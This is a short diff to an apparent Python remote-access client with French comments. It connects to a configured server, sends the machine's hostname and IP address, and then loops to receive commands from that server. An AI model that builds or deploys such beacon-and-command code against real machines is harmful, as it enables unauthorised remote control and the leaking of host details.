@@ -27,8 +27,9 @@ def main():
     sock.connect((SERVER_IP, SERVER_PORT))
     print(f"[+] Connecte a {SERVER_IP}:{SERVER_PORT}")
 
-    # on envoie juste le hostname pour l'instant
-    sock.send(socket.gethostname().encode())
+    # on envoie le hostname et notre ip au serveur
+    info = f"{socket.gethostname()} - {get_ip()}"
+    sock.send(info.encode())
 
     while True:
         commande = sock.recv(BUFFER).decode().strip()
